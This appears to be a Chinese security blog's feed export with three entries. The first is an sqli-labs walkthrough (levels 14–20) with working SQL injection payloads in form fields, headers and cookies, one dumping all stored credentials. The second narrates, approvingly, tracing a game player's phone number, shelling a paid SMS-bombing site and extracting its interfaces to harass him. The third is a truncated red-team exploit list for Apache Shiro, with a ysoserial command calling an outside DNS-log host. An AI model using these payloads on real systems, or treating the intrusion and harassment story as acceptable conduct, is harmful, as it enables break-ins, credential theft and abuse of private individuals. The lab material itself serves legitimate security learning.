title="Less-14"></a>Less-14</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>报错、布尔盲注、延时盲注</td><td><code>username=&quot;x&quot;</code></td></tr></tbody></table><p><strong>简单源码分析</strong></p><pre><code class="hljs Php"><span class="hljs-comment"># 先使用 双引号 再直接带入 SQL 语句</span><span class="hljs-variable">$uname</span>=<span class="hljs-string">&#x27;&quot;&#x27;</span>.<span class="hljs-variable">$uname</span>.<span class="hljs-string">&#x27;&quot;&#x27;</span>;<span class="hljs-variable">$passwd</span>=<span class="hljs-string">&#x27;&quot;&#x27;</span>.<span class="hljs-variable">$passwd</span>.<span class="hljs-string">&#x27;&quot;&#x27;</span>; @<span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT username, password FROM users WHERE username=<span class="hljs-subst">$uname</span> and password=<span class="hljs-subst">$passwd</span> LIMIT 0,1&quot;</span>;</code></pre><p>和 Less-13 异曲同工，只是拼接方式不一样，我们换对应的闭合方式即可进行注入。</p><h2 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>布尔盲注、延时盲注</td><td><code>username=&#39;x&#39;</code></td></tr></tbody></table><p>源码中注释掉了 MySQL 的报错日志，所以这里就不可以进行报错注入了，只能使用布尔盲注或者延时盲注。</p><p>这里不再做重复无意义的记录了。</p><h2 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>布尔盲注、延时盲注</td><td><code>username=(&quot;x&quot;)</code></td></tr></tbody></table><p>和 Less-15 注入类型一致，更换对应的闭合方式即可。</p><h2 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>报错、布尔盲注、延时盲注</td><td><code>password = &#39;$passwd&#39;</code></td></tr></tbody></table><p><strong>简单源码分析</strong>:</p><pre><code class="hljs Php"><span class="hljs-comment"># uname 参数被过滤了</span><span class="hljs-variable">$uname</span>=check_input(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;uname&#x27;</span>]);  <span class="hljs-variable">$passwd</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>];<span class="hljs-comment"># SELECT 语句只获取了 uname 参数 但是被过滤了 没戏</span>@<span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT username, password FROM users WHERE username= <span class="hljs-subst">$uname</span> LIMIT 0,1&quot;</span>;<span class="hljs-keyword">if</span> select 结果正确:    <span class="hljs-comment"># 更新语句 使用单引号拼接 passwd</span>    <span class="hljs-variable">$update</span>=<span class="hljs-string">&quot;UPDATE users SET password = &#x27;<span class="hljs-subst">$passwd</span>&#x27; WHERE username=&#x27;<span class="hljs-subst">$row1</span>&#x27;&quot;</span>;    <span class="hljs-keyword">if</span> mysql 报错:            print_r(mysql_error());</code></pre><p>从源码中可以分享唯一的注入点是在 update 语句里面，只使用了单引号拼接。因为操作正确并没有啥提示，所以不能使用联合查询注入，因为输出了报错日志，所以还可以进行报错注入，那么下面就演示一下报错注入吧：</p><pre><code class="hljs Bash">uname=admin&amp;passwd=1<span class="hljs-string">&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1)#&amp;submit=Submit</span></code></pre><h2 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>报错、布尔盲注、延时盲注</td><td><code>VALUES (&#39;$uagent&#39;)</code></td></tr></tbody></table><p><strong>简单源码分析</strong>:</p><pre><code class="hljs Php"><span class="hljs-comment"># 获取请求的 uagent 和 ip 地址</span><span class="hljs-variable">$uagent</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_USER_AGENT&#x27;</span>];<span class="hljs-variable">$IP</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>];<span class="hljs-keyword">if</span> 输入了uname 和 passwd:    <span class="hljs-comment"># 对这两个参数进行过滤</span>    <span class="hljs-variable">$uname</span> = check_input(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;uname&#x27;</span>]);    <span class="hljs-variable">$passwd</span> = check_input(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>]);    <span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT  users.username, users.password FROM users WHERE users.username=<span class="hljs-subst">$uname</span> and users.password=<span class="hljs-subst">$passwd</span> ORDER BY users.id DESC LIMIT 0,1&quot;</span>;    <span class="hljs-keyword">if</span> SQL语句有返回结果:        <span class="hljs-comment"># 执行 insert 语句 这里 uagent 和 ip_address 通过单引号拼接 并且 没有过滤</span>        <span class="hljs-variable">$insert</span>=<span class="hljs-string">&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;<span class="hljs-subst">$uagent</span>&#x27;, &#x27;<span class="hljs-subst">$IP</span>&#x27;, <span class="hljs-subst">$uname</span>)&quot;</span>;            输出 <span class="hljs-variable">$uagent</span>;        print_r(mysql_error());    <span class="hljs-keyword">else</span>:        print_r(mysql_error());</code></pre><p>这个代码漏洞点出在了 insert 语句，这里没有对 uagent 和 ip_address 进行过滤，并且输出了 mysql 的报错信息，所以本关支持 报错注入、布尔盲注和延时盲注。</p><p><strong>PHP 里用来获取客户端 IP 的变量</strong></p><ul><li><code>$_SERVER[&#39;HTTP_CLIENT_IP&#39;]</code> 这个很少使用，不一定服务器都实现了。客户端可以伪造。</li><li><code>$_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]</code>，客户端可以伪造。</li><li><code>$_SERVER[&#39;REMOTE_ADDR&#39;]</code>，客户端不能伪造。</li></ul><p>所以这里的 IP 是无法被伪造的，这里只能通过修改 user-agent 来进行注入，考虑到 insert 语句的特殊性，这里使用闭合方式来闭合掉后面的语句，因为输出了 mysql 报错日志了，这里尝试报错注入效率会更高一点：</p><p>首先这里要输入正确的账号和密码才能绕过账号密码判断，才能进入处理uagent部分</p><pre><code class="hljs Http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/Less-18/</span> HTTP/1.1<span class="hljs-attribute">Host</span>: sqli.pl<span class="hljs-attribute">User-Agent</span>: 1&#x27; and updatexml(1,concat(0x7e,(select username from users limit 1,1),0x7e),1) and &#x27;1&#x27;=&#x27;1<span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3<span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate<span class="hljs-attribute">Referer</span>: http://sqli.pl/Less-18/<span class="hljs-attribute">DNT</span>: 1<span class="hljs-attribute">X-Forwarded-For</span>: 8.8.8.8<span class="hljs-attribute">Connection</span>: close<span class="hljs-attribute">Upgrade-Insecure-Requests</span>: 1<span class="hljs-attribute">Content-Type</span>: application/x-www-form-urlencoded<span class="hljs-attribute">Content-Length</span>: 34uname=admin&amp;passwd=0&amp;submit=Submit</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/WEB%E5%AE%89%E5%85%A8/20200720_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%9F%BA%E7%A1%80%E6%8C%91%E6%88%981-20%E5%85%B3/02.png" alt="img"></p><h2 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>报错、布尔盲注、延时盲注</td><td><code>VALUES (&#39;$uagent&#39;)</code></td></tr></tbody></table><p><strong>简单源码分析</strong>:</p><pre><code class="hljs Php"><span class="hljs-comment"># 获取请求的 referer 和 ip 地址</span><span class="hljs-variable">$uagent</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_REFERER&#x27;</span>];<span class="hljs-variable">$IP</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>];<span class="hljs-keyword">if</span> 输入了uname 和 passwd:    <span class="hljs-comment"># uname 和 passwd 参数均被过滤</span>    <span class="hljs-variable">$uname</span> = check_input(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;uname&#x27;</span>]);    <span class="hljs-variable">$passwd</span> = check_input(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>]);    <span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT  users.username, users.password FROM users WHERE users.username=<span class="hljs-subst">$uname</span> and users.password=<span class="hljs-subst">$passwd</span> ORDER BY users.id DESC LIMIT 0,1&quot;</span>;    <span class="hljs-keyword">if</span> SQL语句有返回结果:        <span class="hljs-comment"># 单引号拼接后直接带入 insert 语句</span>        <span class="hljs-variable">$insert</span>=<span class="hljs-string">&quot;INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES (&#x27;<span class="hljs-subst">$uagent</span>&#x27;, &#x27;<span class="hljs-subst">$IP</span>&#x27;)&quot;</span>;        输出 <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_REFERER&#x27;</span>]        print_r(mysql_error());        <span class="hljs-keyword">else</span>:        print_r(mysql_error());</code></pre><p>本关和 Less-18 异曲同工，只是这里的漏洞点出在了 referer 里面，其他利用方式基本上也是一毛一样，所以下面直接上 payload 演示吧：</p><pre><code class="hljs Http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/Less-19/</span> HTTP/1.1<span class="hljs-attribute">Host</span>: sqli.pl<span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0<span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3<span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate<span class="hljs-attribute">Referer</span>: 1&#x27; and updatexml(1,concat(0x7e,(select username from users limit 1,1),0x7e),1) and &#x27;1&#x27;=&#x27;1<span class="hljs-attribute">DNT</span>: 1<span class="hljs-attribute">X-Forwarded-For</span>: 8.8.8.8<span class="hljs-attribute">Connection</span>: close<span class="hljs-attribute">Upgrade-Insecure-Requests</span>: 1<span class="hljs-attribute">Content-Type</span>: application/x-www-form-urlencoded<span class="hljs-attribute">Content-Length</span>: 34uname=admin&amp;passwd=0&amp;submit=Submit</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/WEB%E5%AE%89%E5%85%A8/20200720_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%9F%BA%E7%A1%80%E6%8C%91%E6%88%981-20%E5%85%B3/03.png" alt="img"></p><h2 id="Less-20"><a href="#Less-20" class="headerlink" title="Less-20"></a>Less-20</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>username=&#39;$cookee&#39;</code></td></tr></tbody></table><p><strong>简单源码分析</strong>:</p><pre><code class="hljs Php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">if</span> cookie 中不存在 uname 参数:      输出了一堆无用的信息    <span class="hljs-keyword">if</span> 提交了 uname 和 passwd:        <span class="hljs-comment"># 进行过滤</span>        <span class="hljs-variable">$uname</span> = check_input(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;uname&#x27;</span>]);        <span class="hljs-variable">$passwd</span> = check_input(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>]);        <span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT  users.username, users.password FROM users WHERE users.username=<span class="hljs-subst">$uname</span> and users.password=<span class="hljs-subst">$passwd</span> ORDER BY users.id DESC LIMIT 0,1&quot;</span>;        <span class="hljs-variable">$cookee</span> = <span class="hljs-variable">$row1</span>[<span class="hljs-string">&#x27;username&#x27;</span>];        <span class="hljs-keyword">if</span> 有查询结果:            <span class="hljs-comment"># 将 uname 的值设置给 cookie 里面的 uname 参数</span>            setcookie(<span class="hljs-string">&#x27;uname&#x27;</span>, <span class="hljs-variable">$cookee</span>, time()+<span class="hljs-number">3600</span>);        <span class="hljs-keyword">else</span>:            print_r(mysql_error());<span class="hljs-keyword">else</span>:    <span class="hljs-keyword">if</span> POST 数据里面没有 submit 参数:        <span class="hljs-variable">$cookee</span> = <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;uname&#x27;</span>];        <span class="hljs-comment"># 直接将 cookee 通过单引号拼接到 SQL 语句中</span>        <span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="hljs-subst">$cookee</span>&#x27; LIMIT 0,1&quot;</span>;        <span class="hljs-keyword">if</span> 查询无结果:            输出 mysql_error()        <span class="hljs-keyword">if</span> 有结果:            输出查询的信息    <span class="hljs-keyword">else</span>:        <span class="hljs-comment"># 将 uname 的值设置给 cookie 里面的 uname 参数</span>        setcookie(<span class="hljs-string">&#x27;uname&#x27;</span>, <span class="hljs-variable">$row1</span>[<span class="hljs-string">&#x27;username&#x27;</span>], time()<span class="hljs-number">-3600</span>);<span class="hljs-meta">?&gt;</span></code></pre><p>从源码中可以分析出 Less-20 要复杂一点，不过问题还是存在，从 cookie 中读取的 uname 参数值 并直接拼接到了 SQL 语句中了，这就导致了注入点的产生，并且还输出了查询信息，所以这里也是可以进行联合查询注入的。因为是基础关卡的最后一关</p><h3 id="联合查询注入-2"><a href="#联合查询注入-2" class="headerlink" title="联合查询注入"></a>联合查询注入</h3><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> /Less-<span class="hljs-number">20</span>/ HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><span class="hljs-attribute">Host</span>: sqli.pl<span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; WOW<span class="hljs-number">64</span>; rv:<span class="hljs-number">49</span>.<span class="hljs-number">0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">49</span>.<span class="hljs-number">0</span><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,en-US;q=<span class="hljs-number">0</span>.<span class="hljs-number">5</span>,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">3</span><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate<span class="hljs-attribute">Cookie</span>: uname=-admin&#x27; union select (select group_concat(username,&#x27;:&#x27;,password+SEPARATOR+<span class="hljs-number">0</span>x<span class="hljs-number">3</span>c<span class="hljs-number">62723</span>e) from users),<span class="hljs-number">2</span>,<span class="hljs-number">3</span>#<span class="hljs-attribute">DNT</span>: <span class="hljs-number">1</span><span class="hljs-attribute">X</span>-Forwarded-For: <span class="hljs-number">8.8.8.8</span><span class="hljs-attribute">Connection</span>: close<span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/WEB%E5%AE%89%E5%85%A8/20200720_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%9F%BA%E7%A1%80%E6%8C%91%E6%88%981-20%E5%85%B3/04.png" alt="img"></p><h3 id="报错注入-1"><a href="#报错注入-1" class="headerlink" title="报错注入"></a>报错注入</h3><pre><code class="hljs Http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/Less-20/</span> HTTP/1.1<span class="hljs-attribute">Host</span>: sqli.pl<span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0<span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3<span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate<span class="hljs-attribute">Cookie</span>: uname=admin&#x27; and updatexml(1,concat(0x7e,(select username from users limit 1,1),0x7e),1)#<span class="hljs-attribute">DNT</span>: 1<span class="hljs-attribute">X-Forwarded-For</span>: 8.8.8.8<span class="hljs-attribute">Connection</span>: close<span class="hljs-attribute">Upgrade-Insecure-Requests</span>: 1</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/WEB%E5%AE%89%E5%85%A8/20200720_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%9F%BA%E7%A1%80%E6%8C%91%E6%88%981-20%E5%85%B3/05.jpg" alt="img"></p><h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><p>布尔盲注和延时盲注也是 OK 的，但是实际上手工注入的效率并不如联合与报错注入，所以这里就不演示了。</p>]]></content>
    
    
    <categories>
      
      <category>WEB安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SQL注入</tag>
      
      <tag>sqli lab</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>一次寻找接口的惨痛经历</title>
    <link href="/p/3b26dc86.html"/>
    <url>/p/3b26dc86.html</url>
    
    <content type="html"><![CDATA[<h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>事情得从一款叫明日之后的游戏说起，遇到某个口嗨的想要我的信息，顺手反查到他的手机号码。</p><p>可是只有手机号码也没啥用，毕竟又不能喊他约架。然后突然想到土司一个发带后门短信轰炸源码导致被封号的老哥。</p><p>翻了翻帖子，下载到本地搭建了起来，可惜接口不够猛烈啊，于是网上寻找一些收费的轰炸站点，开始黑吃黑。</p><a id="more"></a><h2 id="故事开始"><a href="#故事开始" class="headerlink" title="故事开始"></a>故事开始</h2><p>很快就找到了目标站，这里就不上图了，幸运的发现有死抓死吐的洞，就这样，三分钟弹了个shell到自己服务器上。</p><p>开始疯狂在对方服务器上找数据库，起初以为接口保存在裤子里，但是翻了半天，并没有找到。</p><p>不管三七二十一，把源码和裤子打包到本地慢慢找。</p><h2 id="误导"><a href="#误导" class="headerlink" title="误导"></a>误导</h2><p>在phone目录的main.jsp中发现这样一长串的js代码，肯定是做了处理。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20200620_%E4%B8%80%E6%AC%A1%E5%AF%BB%E6%89%BE%E6%8E%A5%E5%8F%A3%E7%9A%84%E6%83%A8%E7%97%9B%E7%BB%8F%E5%8E%86/01.png" alt="一次寻找接口的惨痛经历"></p><p>不过这种加密方式以前好像看别人说过怎么解，复制到一个新的html文件，使用alert。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20200620_%E4%B8%80%E6%AC%A1%E5%AF%BB%E6%89%BE%E6%8E%A5%E5%8F%A3%E7%9A%84%E6%83%A8%E7%97%9B%E7%BB%8F%E5%8E%86/02.png" alt="一次寻找接口的惨痛经历"></p><p>就这样得到了加密前的源码，可以看出是ajax发包的，于是自己当时十分确定接口就在这些js中。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20200620_%E4%B8%80%E6%AC%A1%E5%AF%BB%E6%89%BE%E6%8E%A5%E5%8F%A3%E7%9A%84%E6%83%A8%E7%97%9B%E7%BB%8F%E5%8E%86/03.png" alt="一次寻找接口的惨痛经历"></p><p>切换回client目录的main.jsp文件，确实发现了加密的代码，不过使用的是sojson.v5加密，变量名都被替换了，应该是不能完全解密，在网上也看了一些文章，并没有发现什么详细的解密过程。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20200620_%E4%B8%80%E6%AC%A1%E5%AF%BB%E6%89%BE%E6%8E%A5%E5%8F%A3%E7%9A%84%E6%83%A8%E7%97%9B%E7%BB%8F%E5%8E%86/04.png" alt="一次寻找接口的惨痛经历"></p><p>就这样，没有头绪了，眼看接口在眼前却解不开。</p><h2 id="误导-1"><a href="#误导-1" class="headerlink" title="误导"></a>误导</h2><p>继续翻了翻其他目录，发现old目录下存在main.jsp，对比了下确定是同一个文件，但是这个并没有加密，激动得蹦了起来。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20200620_%E4%B8%80%E6%AC%A1%E5%AF%BB%E6%89%BE%E6%8E%A5%E5%8F%A3%E7%9A%84%E6%83%A8%E7%97%9B%E7%BB%8F%E5%8E%86/05.png" alt="一次寻找接口的惨痛经历"></p><p>But，从上翻到下，并未发现接口的任何信息，只有一个url，而且提供了帐号密码，从提供的这些信息来看，感觉是调用了远程的接口。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20200620_%E4%B8%80%E6%AC%A1%E5%AF%BB%E6%89%BE%E6%8E%A5%E5%8F%A3%E7%9A%84%E6%83%A8%E7%97%9B%E7%BB%8F%E5%8E%86/06.png" alt="一次寻找接口的惨痛经历"></p><p>然后我就用提供的这些参数一顿操作，发现无论如何，都是跳转到BC的站，莫非是引流的。</p><p>开始郁闷了，掏出自己03的虚拟机，把源码在本地搭建了起来，是可以正常运行的，而且火力还挺猛。</p><p>利用fd抓包，可以抓到接口的信息，心里暗自高兴，写了个脚本把抓到的信息处理了一下，加到自己的裤子中，结果就收到三四条短信。。。</p><h2 id="继续懵逼"><a href="#继续懵逼" class="headerlink" title="继续懵逼"></a>继续懵逼</h2><p>很无奈，决定从头仔细看一遍代码，对调用的函数都跟踪了一下，找到了关键的代码位置。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20200620_%E4%B8%80%E6%AC%A1%E5%AF%BB%E6%89%BE%E6%8E%A5%E5%8F%A3%E7%9A%84%E6%83%A8%E7%97%9B%E7%BB%8F%E5%8E%86/07.png" alt="一次寻找接口的惨痛经历"></p><p>抓包发现请求包和响应包都是加密的，在虚拟机自己改代码进行调试，将modelUrls和params输出，然后成功显示出来了。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20200620_%E4%B8%80%E6%AC%A1%E5%AF%BB%E6%89%BE%E6%8E%A5%E5%8F%A3%E7%9A%84%E6%83%A8%E7%97%9B%E7%BB%8F%E5%8E%86/08.png" alt="一次寻找接口的惨痛经历"></p><p>继续写脚本处理数据，本以为事情到此结束，可是收到的又是不到10条短信。。。</p><h2 id="悔恨"><a href="#悔恨" class="headerlink" title="悔恨"></a>悔恨</h2><p>此时真的不知道接口位置了，只能继续往前推，找到请求的url，“callPhone!callNumberPhone.action”，但是自己对这玩意也不懂呀，不知道代码位置在哪，于是一个目录一个目录的翻，吃了ide的亏，一开始翻的时候ide中并没有显示这些class文件。不然也不会走这么多弯路了。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20200620_%E4%B8%80%E6%AC%A1%E5%AF%BB%E6%89%BE%E6%8E%A5%E5%8F%A3%E7%9A%84%E6%83%A8%E7%97%9B%E7%BB%8F%E5%8E%86/09.png" alt="一次寻找接口的惨痛经历"></p><h2 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h2><p>找到了class文件，就进行了反编译，就这样，所有的接口都到手了。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20200620_%E4%B8%80%E6%AC%A1%E5%AF%BB%E6%89%BE%E6%8E%A5%E5%8F%A3%E7%9A%84%E6%83%A8%E7%97%9B%E7%BB%8F%E5%8E%86/10.png" alt="一次寻找接口的惨痛经历"></p><p>处理后在本地测试，是自己想要的结果。抽了自己两掌，事情结束。</p>]]></content>
    
    
    <categories>
      
      <category>原创文章</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>2020攻防演练弹药库-您有主机上线请注意</title>
    <link href="/p/f772ec2f.html"/>
    <url>/p/f772ec2f.html</url>
    
    <content type="html"><![CDATA[<h2 id="第一节"><a href="#第一节" class="headerlink" title="第一节"></a>第一节</h2><blockquote><p>各小伙伴们, 安全界一年一度的激动人心的攻防演练盛况即将来临:) 这里给大家准备些弹药, 主要是近些年的可以进后台/getshell的漏洞, 漏洞太多难免疏漏.<br>基本都是常规操作加一点小技巧, 大部分漏洞均分析过或实践过, 如有错误欢迎【斧】正, 如有补充也欢迎评论留言.<br>另外, 有些漏洞没有找到外部公开信息, 考虑涉及相关法律法规, 不宜披露, 请见谅. 想深度交流的欢迎沟通.<br>由于本文长度接近四万字, 所以采取分篇连载.</p></blockquote><h2 id="Apache-Shiro-RememberMe-反序列化导致的命令执行漏洞-Shiro-550-CVE-2016-4437"><a href="#Apache-Shiro-RememberMe-反序列化导致的命令执行漏洞-Shiro-550-CVE-2016-4437" class="headerlink" title="Apache Shiro RememberMe 反序列化导致的命令执行漏洞 (Shiro-550, CVE-2016-4437)"></a>Apache Shiro RememberMe 反序列化导致的命令执行漏洞 (Shiro-550, CVE-2016-4437)</h2><p><strong>1. 漏洞简介</strong></p><p>Apache Shiro 是企业常见的Java安全框架, 其漏洞在2019年攻防演练中起到显著作用</p><p><strong>2. 影响组件</strong></p><p>Apache Shiro (由于密钥泄露的问题, 部分高于1.2.4版本的Shiro也会受到影响)</p><p><strong>3. 漏洞指纹</strong></p><p><code>set-Cookie: rememberMe=deleteMe</code><br>或者URL中有shiro字样<br>有一些时候服务器不会主动返回 <code>rememberMe=deleteMe</code>, 直接发包即可</p><p><strong>4. Fofa Dork</strong></p><p><code>app=&quot;Apache-Shiro&quot;</code></p><p><strong>5. 漏洞分析</strong></p><p>【漏洞分析】Shiro RememberMe 1.2.4 反序列化导致的命令执行漏洞<br><a href="https://paper.seebug.org/shiro-rememberme-1-2-4/">https://paper.seebug.org/shiro-rememberme-1-2-4/</a></p><p><strong>6. 漏洞利用</strong></p><p>wyzxxz/shiro_rce: shiro rce 反序列 命令执行 一键工具<br><a href="https://github.com/wyzxxz/shiro_rce">https://github.com/wyzxxz/shiro_rce</a></p><p>Apache Shiro回显poc改造计划<br><a href="https://mp.weixin.qq.com/s/-ODg9xL838wro2S_NK30bw">https://mp.weixin.qq.com/s/-ODg9xL838wro2S_NK30bw</a></p><p><strong>7. 利用技巧</strong></p><p>1.使用多个泄露的key进行遍历, 这个在实战中确实有效</p><p>关于Shiro反序列化漏洞的延伸—升级shiro也能被shell<br><a href="https://mp.weixin.qq.com/s/NRx-rDBEFEbZYrfnRw2iDw">https://mp.weixin.qq.com/s/NRx-rDBEFEbZYrfnRw2iDw</a></p><p>Shiro 100 Key<br><a href="https://mp.weixin.qq.com/s/sclSe2hWfhv8RZvQCuI8LA">https://mp.weixin.qq.com/s/sclSe2hWfhv8RZvQCuI8LA</a></p><p>2.使用 <code>URLDNS</code> 进行检测提速</p><p>使用适应性最强的<code>URLDNS</code>(这个不受JDK版本和安全策略影响, 除非网络限制不能出DNS)进行检测</p><p>且可以使用<code>ysoserial</code>提前生成序列化内容</p><p><code>java -jar target/ysoserial-0.0.5-SNAPSHOT-all.jar URLDNS &quot;http://1234567890.test.ceye.io&quot; &gt; urldns.ser</code></p><p>然后使用<code>占位符+目标url hash</code>的方法修改序列化内容中的<code>urldns</code>地址</p><p>提高检测速度以及后续检测无需使用<code>ysoserial</code></p><p>例如 <code>1234567890.test.ceye.io</code> 可以换成 <code>md5(&#39;www.qq.com&#39;).hexdigest() [:10].test.ceye.io</code></p><p>也就是 <code>9d2c68d82d.test.ceye.io</code></p><p>可以预先记录 hash</p><p><code>9d2c68d82d www.qq.com</code></p><p>然后进行hash查表就可以知道是<code>DNSLOG</code>来自哪个目标, 性能会提高不少</p><p>3.已知目标使用了<code>Shiro</code>, 可以采取<code>Shiro-721</code>的报错逻辑来进行遍历<code>key</code> — 星光哥</p><p>这样即使DNS不能出网, 也可以通过是否返回 <code>rememberMe=deleteMe</code> 来断定 <code>shiro</code> <code>key</code> 的正确性, 前提是服务器有<code>rememberMe=deleteMe</code>相关回显</p><p><strong>8. 防护方法</strong></p><p>1.升级Shiro到最新版</p><p>2.升级对应JDK版本到 